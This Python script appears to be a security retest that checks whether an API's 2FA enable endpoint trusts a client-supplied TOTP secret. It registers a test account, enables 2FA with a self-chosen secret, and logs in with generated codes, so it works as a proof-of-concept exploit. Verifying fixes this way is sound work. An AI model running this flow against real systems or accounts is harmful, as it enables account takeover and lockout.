     1	#!/usr/bin/env python3
     2	"""Verify: POST /auth/2fa/enable accepts client-supplied `totp_secret`.
     3	
     4	The endpoint should derive the secret from server-side state populated
     5	by POST /auth/2fa/setup — never from the request body. This script
     6	registers a fresh test account, then attempts to enable 2FA with an
     7	attacker-chosen secret (skipping /auth/2fa/setup entirely) and
     8	verifies the account is subsequently backdoored.
     9	
    10	Optional env vars (with defaults):
    11	    TARGET_URL  Base URL (default: https://api.taintedport.com)
    12	
    13	Usage:
    14	    python3 verify.py
    15	
    16	Exit codes:
    17	    0  vulnerability still present (VULNERABLE)
    18	    1  vulnerability fixed or error   (NOT VULNERABLE)
    19	"""
    20	import os, sys, time, base64, hmac, hashlib, struct, secrets
    21	import requests, urllib3
    22	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    23	
    24	TARGET_URL = os.environ.get("TARGET_URL", "https://api.taintedport.com")
    25	
    26	
    27	def totp(secret_b32, digits=6, step_s=30):
    28	    counter = int(time.time()) // step_s
    29	    padded = secret_b32 + "=" * ((8 - len(secret_b32) % 8) % 8)
    30	    key = base64.b32decode(padded, casefold=True)
    31	    h = hmac.new(key, struct.pack(">Q", counter), hashlib.sha1).digest()
    32	    off = h[-1] & 0x0f
    33	    code = (struct.unpack(">I", h[off:off+4])[0] & 0x7fffffff) % (10**digits)
    34	    return f"{code:0{digits}d}"
    35	
    36	
    37	def check():
    38	    s = requests.Session()
    39	    email = f"verify-2fa-{int(time.time())}-{secrets.token_hex(3)}@example.com"
    40	    password = f"Verify!23-{secrets.token_hex(4)}"
    41	
    42	    # Register fresh victim account
    43	    r = s.post(f"{TARGET_URL}/auth/register",
    44	               json={"name": "verify", "email": email, "password": password},
    45	               verify=False, timeout=15)
    46	    if r.status_code not in (200, 201) or not r.json().get("success"):
    47	        print(f"[NOT VULNERABLE] Could not register test account (HTTP {r.status_code})")
    48	        sys.exit(1)
    49	    token = r.json()["token"]
    50	
    51	    # Attempt to enable 2FA with an attacker-chosen secret, without calling /auth/2fa/setup
    52	    raw = secrets.token_bytes(16)
    53	    attacker_secret = base64.b32encode(raw).decode().rstrip("=")
    54	    code = totp(attacker_secret)
    55	    r = s.post(f"{TARGET_URL}/auth/2fa/enable",
    56	               headers={"Authorization": f"Bearer {token}"},
    57	               json={"totp_secret": attacker_secret, "totp_code": code},
    58	               verify=False, timeout=15)
    59	
    60	    if r.status_code != 200 or not r.json().get("success"):
    61	        print(f"[NOT VULNERABLE] /auth/2fa/enable rejected client-supplied secret (HTTP {r.status_code}): {r.text[:200]}")
    62	        sys.exit(1)
    63	
    64	    # Confirm login is now gated on TOTP
    65	    r = s.post(f"{TARGET_URL}/auth/login",
    66	               json={"email": email, "password": password}, verify=False, timeout=15)
    67	    if not r.json().get("requires_2fa"):
    68	        print(f"[NOT VULNERABLE] Enable succeeded but login not gated on TOTP: {r.text[:200]}")
    69	        sys.exit(1)
    70	
    71	    # Confirm attacker-controlled TOTP grants a session
    72	    code2 = totp(attacker_secret)
    73	    r = s.post(f"{TARGET_URL}/auth/login",
    74	               json={"email": email, "password": password, "totp_code": code2},
    75	               verify=False, timeout=15)
    76	    if r.status_code != 200 or not r.json().get("token"):
    77	        print(f"[NOT VULNERABLE] Attacker TOTP did not authenticate (HTTP {r.status_code}): {r.text[:200]}")
    78	        sys.exit(1)
    79	
    80	    print(f"[VULNERABLE] /auth/2fa/enable trusted client-supplied secret {attacker_secret}; "
    81	          f"attacker TOTP now grants a valid session for {email}.")
    82	    sys.exit(0)
    83	
    84	
    85	if __name__ == "__main__":
    86	    check()